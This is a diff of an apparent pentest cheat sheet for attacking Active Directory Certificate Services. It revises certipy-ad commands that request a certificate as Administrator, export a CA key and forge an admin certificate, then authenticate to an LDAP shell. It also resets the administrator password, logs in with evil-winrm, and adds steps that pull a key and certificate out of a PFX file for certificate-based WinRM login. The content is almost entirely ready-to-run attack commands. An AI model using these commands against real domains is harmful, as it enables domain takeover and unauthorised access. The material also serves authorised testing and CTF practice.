@@ -414,20 +414,27 @@ WriteDacl
 WriteOwner
 
 [*] Active Directory: CS
-+---------- Get Certificate ----------+
-certipy-ad req -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' -ca 'CA_NAME' -template 'TEMPLATE_NAME' -upn 'Administrator' -target $DC -key-size '4096'
-certipy-ad req -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' -ca 'CA_NAME' -template 'TEMPLATE_NAME' -dynamic-endpoint
++---------- Request ----------+
+certipy-ad req -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' -ca '' -template '' -upn 'Administrator' -target $DC -key-size '4096'
+certipy-ad req -dc-ip $TARGET -u '$USERNAME' -p '$PASSWORD' -ca '' -template '' -dynamic-endpoint
 
-+---------- Forge Certificate ----------+
++---------- Forge ----------+
 certutil -store my
 certutil -exportpfx my "75b2f4bbf31f108945147b466131bdca" ca_exported.pfx
 certipy-ad forge -ca-pfx 'ca_exported.pfx' -upn ADMINISTRATOR@$DOM -subject 'CN=ADMINISTRATOR,CN=USERS,DC=$DOM,DC=LOCAL'
 
-+---------- Authenticate Certificate ----------+
-certipy-ad -dc-ip $TARGET auth -ldap-shell -pfx 'administrator.pfx'
-certipy-ad -dc-ip $TARGET auth -ldap-shell -pfx 'administrator_forged.pfx'
++---------- Authenticate ----------+
+certipy-ad auth -dc-ip $TARGET -domain $DC -ldap-shell -pfx 'administrator.pfx'
+certipy-ad auth -dc-ip $TARGET -domain $DC -ldap-shell -pfx 'administrator_forged.pfx'
 change_password administrator 123qweasdF!
 evil-winrm -i $TARGET -u administrator -p '123qweasdF!'
+
++---------- Crack ----------+
+pfx2john user.pfx
+openssl pkcs12 -in user.pfx -nocerts -out auth.key-enc
+openssl rsa -in auth.key-enc -out auth.key
+openssl pkcs12 -in user.pfx -clcerts -nokeys -out auth.crt
+evil-winrm -i $TARGET -S -k auth.key -c auth.crt
 
 [*] Cracking
 +---------- PFX ----------+
